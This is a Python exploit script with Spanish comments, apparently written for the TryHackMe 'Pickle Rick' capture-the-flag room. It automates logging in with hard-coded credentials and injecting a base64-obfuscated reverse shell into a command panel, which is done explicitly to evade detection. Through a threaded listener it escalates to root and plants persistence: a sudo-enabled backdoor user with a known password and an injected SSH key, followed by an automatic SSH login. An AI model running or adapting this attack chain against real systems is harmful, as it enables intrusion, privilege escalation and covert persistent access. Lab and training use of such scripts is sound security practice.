#------------------------------------------------------[Librerias]--------------------------------------------------------------------

import argparse # Librería nativa de Python para crear interfaces de línea de comandos (CLI)
import requests # Librería fundamental para el manejo de peticiones HTTP (GET, POST, etc.)
import payload # Funcion importada que contiene la carga maliciosa
import base64 # Libreria para realizar el encoding y pasar los filtros
import socket # Libreria para configurar Listener (netcat casero)
import time # Libreria importada para evitar problemas de race condition en nuestro Listener
import threading # Libreria necesaria para ejecutar procesos simultaneamente
# Modulos para la ejecucion de comandos en el sistema
import os
import subprocess

#-------------------------------------------------[Variables Globales]----------------------------------------------------------------

# Creamos una sesion para mantener las cookies
sesion = requests.Session()
# Credenciales para el login
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Ruta donde se almacenara la llave
PATH_LLAVE = 'llave_gacker'

# Compruebo si existe la llave, si no, la creo
if not os.path.exists(PATH_LLAVE):
    # Genera la llave RSA de 4096 sin pedir confirmacion
    subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-f', PATH_LLAVE, '-N', ''], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Leemos la llave publica
with open(f'{PATH_LLAVE}.pub', 'r') as archivo_llave:
    # Eliminamos saltos de linea y evitamos problemas de inyeccion
    llave_publica = archivo_llave.read().strip()

#------------------------------------------------------[Funciones]--------------------------------------------------------------------

# Funcion para ejecutar la reverse shell en el servidor
def ejecutar_comando(endpoint, payload):

    # Definimos el payload con la carga maliciosa
    PAYLOAD_RSHELL = {
        'command' : payload,
        'sub': 'Execute'
    }

    try:
        # Mandamos el payload al servidor y añadimos timeout (la ejecucion se quedara congelada ya que es una rshell)
        sesion.post(endpoint, data=PAYLOAD_RSHELL, timeout=3)
    # Capturamos el timeout, que significa exito!
    except requests.exceptions.ReadTimeout:
        return '[+] Reverse Shell ejecutada (Timeout...).'
    return '[-] Error: El comando no provocó Timeout.'

# Funcion para escuchar la reverse shell y ejecutar comandos de escalada y persistencia
def listener(puerto, verbose=False):

    # Primero se crea el socket y se configura
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Evitamos errores si el puerto se queda atascado
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Escucha en todas las interfaces en el puerto indicado
    s.bind(('0.0.0.0', puerto))
    s.listen(1)
    
    if verbose:
        print(f'[V] (Hilo Secundario) Escuchando en el puerto {puerto}...')

    # Esperamos a la victima (bloqueo hasta recibir la llamada de la revshell)
    conexion, direccion = s.accept()

    if verbose:
        print(f'[V] (Hilo Secundario) ¡Shell capturada desde {direccion[0]}!')

    #-------------------------------------------[Fase 3: Escalada y Persistencia]-------------------------------------------------------


    # Mandamos automaticamente los siguientes comandos con .send
    conexion.send(b'sudo su\n') # Escalamos con sudo su ya que cualquier usuario puede elevarse sin passwd
    conexion.send(b'useradd -m -s /bin/bash gacker\n') # Creo un usuario con home y shell
    conexion.send(b"echo 'gacker:gacker' | chpasswd\n") # Se le asigna una contrasena al usuario
    conexion.send(b'usermod -aG sudo gacker\n') # Anadimos el usuario gacker al grupo sudo

    conexion.send(b'mkdir -p /home/gacker/.ssh\n') # Creamos directorio ssh del usuario
    cmd_llave = f"echo '{llave_publica}' > /home/gacker/.ssh/authorized_keys\n"
    conexion.send(cmd_llave.encode()) # Inyectamos la clave previamente almacenada
    
    conexion.send(b"chmod 700 /home/gacker/.ssh\n") # Permisos para la carpeta de SSH
    conexion.send(b"chmod 600 /home/gacker/.ssh/authorized_keys\n") # Permisos para el archivo de SSH
    conexion.send(b"chown -R gacker:gacker /home/gacker/.ssh\n") # Asignamos como propietario al usuario gacker
    
    # Despues de los comandos anadimos un sleep para asegurarnos de que los procese
    time.sleep(1)
    conexion.close() #   Cerramos la conexion con la victima
    s.close() # Cerramos el socket
    
    if verbose:
        print(f'[V] (Hilo Secundario) Configuración de persistencia inyectada con éxito.')

#--------------------------------------------------------[Main]-----------------------------------------------------------------------

# Esta es la funcion principal que se ejecuta al correr el script, aqui se definen los argumentos que vamos a usar
def main():
    # Creamos el parser
    parser = argparse.ArgumentParser(
        # Formateamos el parser para que sea legible o por lo menos para poder personalizarlo con facilidad
        formatter_class=argparse.RawTextHelpFormatter,
        # Descripcion de lo que hace el script
        description = '''[+] Este script automatiza el proceso de:

    [-] Login (manteniendo la sesion)
    [-] Ejecucion de RCE (Reverse Shell)
    [-] Escalada de privilegios
    [-] Persistencia (Usuario con permisos de administrador)
    [-] Creacion de Backdoor SSH (Conexion automatica)''',
        # Epilogo que muestra los ejemplos de uso
        epilog = '''[+] Ejemplos de uso:

    [-] Definiendo IP Objetivo | IP Atacante | Puerto -- > python script.py -t 192.168.60.23 -l 127.0.0.1 -p 4444
    [-] Solo definiendo IPs --> python script.py -t 192.168.43.21 -l 127.0.0.1'''

    )

    # Definimos los argumentos que vamos a usar en el script cuando lo ejecutemos
    parser.add_argument('-t', '--target', required = True,
    help = '[Requerido] IP de la maquina victima')
    parser.add_argument('-l', '--lhost', required = True,
    help = '[Requerido] IP de atacante (VPN -> THM)')
    parser.add_argument('-p', '--lport', type = int, default = 4444,
    help = '[Opcional] Puerto a la escucha (Por defecto: 4444)')
    parser.add_argument('-v', '--verbose', action = 'store_true',
    help = '[Opcional] Muestra el proceso detallado')

    # Guardamos los argumentos en la variable 'args'
    args =  parser.parse_args()

    # Imprimimos los valores definidos en la terminal (para verificar que todo esta correcto)
    print('=' * 50)
    print(f'''[+] Valores definidos:
    [-] IP Victima: {args.target}
    [-] IP Atacante: {args.lhost}
    [-] Puerto a la escucha: {args.lport}''')
    print('=' * 50)

#----------------------------------------------------[Fase 1: Login]------------------------------------------------------------------

    if args.verbose:
        print(f'[V] Fase 1: Realizando los preparativos para el login en {args.target}...')

    # Definimos el endpoint de login en una variable
    login_endpoint = f'http://{args.target}/login.php'
    
    if args.verbose:
        print(f'[V] Lanzando petición POST con credenciales hacia {login_endpoint}...')
    
    # Intentamos conectar con el servidor y guardamos la respuesta en respuesta_login
    try:
        respuesta_login = sesion.post(login_endpoint, data=CREDENCIALES, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f'[-] Imposible conectar con {args.target}. Error: {e}.')
        return
    
    # Verificamos que el login fue exitoso (codigo 200 y que contiene 'Command Panel' en el texto)
    if respuesta_login.status_code == 200 and 'Command Panel' in respuesta_login.text:
        print('[+] ¡Conexión exitosa con el servidor!')
        if args.verbose: # Si el verbose esta activo, imprimimos las cookies de sesion
            print(f'[V] Cookies de sesión obtenidas: {sesion.cookies.get_dict()}')
    else:
        print('[-] Error: Login rechazado (credenciales invalidas u objetivo no alcanzable)')
        return

#-----------------------------------------------------[Fase 2: RCE]-------------------------------------------------------------------

    if args.verbose:
        print(f'\n[V] Fase 2: Configurando el ataque (Reverse Shell y Listener)')

    # Definimos el endpoint de RCE en una variable
    rce_endpoint = f'http://{args.target}/portal.php'
    # Antes de mandar el payload, arrancamos el listener evitando race conditions 
    hilo = threading.Thread(target=listener, args=(args.lport, args.verbose)) # Creamos un hilo para el listener

    hilo.start() # Iniciamos el hilo
    time.sleep(1) # Esperamos 1 segundo para evitar problemas con el socket
    
    if args.verbose:
        print(f'[V] Invocando payload del archivo payload.py y ofuscándolo hacia {args.lhost}:{args.lport}...')

    # Llamamos a la funcion reverse_shell del modulo payload y guardamos el resultado en payload_raw
    payload_raw = payload.reverse_shell(args.lhost, args.lport)
    # Realizamos la conversion necesaria a b64 para que el payload no sea detectado
    payload_base64 = base64.b64encode(payload_raw.encode()).decode()
    # Elaboramos el comando que va a ejecutar el payload
    payload_cmd = f"echo '{payload_base64}' | base64 -d | bash" 
    
    if args.verbose:
        print(f'[V] Inyectando RCE en {rce_endpoint}...')

    # Ejecutamos el comando en el servidor para inyectar el payload y obtener la shell
    resultado_rce = ejecutar_comando(rce_endpoint, payload_cmd)
    
    if args.verbose:
        print(f'[V] {resultado_rce}')
        print(f'[V] Esperando a que el Listener termine de inyectar los comandos...')
        
    # Esperamos a que termine la conexion en segundo plano del listener (ejecucion de todos los comandos)
    hilo.join()
    
    print('[+] Fase 2: Completada. Arquitectura Múltiple (Main y Listener).')

#--------------------------------------------------[Fase 3: Auto-SSH]-----------------------------------------------------------------

    if args.verbose:
        print(f'\n[V] Fase 3: Auto-configurando cliente nativo para acceso interactivo...')

    # Damos permisos a la llave privada para que SSH pueda leerla y no de error
    os.chmod(PATH_LLAVE, 0o600) 
    
    print('[+] Operación terminada. Inicializando consola interactiva SSH (gacker)...\n')
    print('=' * 50 + '\n')
    
    # Conectamos directamente al SSH. Añadimos StrictHostKeyChecking para evitar que pregunte si queremos conectar con el host
    subprocess.run(['ssh', '-i', PATH_LLAVE, '-o', 'StrictHostKeyChecking=no', f'gacker@{args.target}'])

#--------------------------------------------------------[Main]-----------------------------------------------------------------------

if __name__ == '__main__':
    main()
